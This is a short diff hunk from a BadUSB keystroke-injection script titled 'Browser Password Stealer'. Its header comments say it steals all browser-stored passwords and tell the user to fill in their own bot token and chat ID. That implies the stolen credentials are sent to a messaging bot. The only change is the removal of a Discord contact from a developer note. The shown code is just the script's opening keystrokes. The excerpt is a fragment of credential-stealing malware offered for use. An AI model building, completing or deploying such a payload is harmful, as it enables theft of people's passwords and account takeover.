@@ -8,7 +8,7 @@ REM ##########################
 REM Title: Browser Password Stealer
 REM Description: Steals all passwords stored in the Browser(s)
 REM Note: Make sure to change $BotToken and $ChatID to yours
-REM Dev Note: If you get an error about -Form it means your powershell isnt updated and doesnt support it, if you find an alternative message birdy0579 on Discord
+REM Dev Note: If you get an error about -Form it means your powershell isnt updated and doesnt support it
 
 GUI r
 DELAY 300
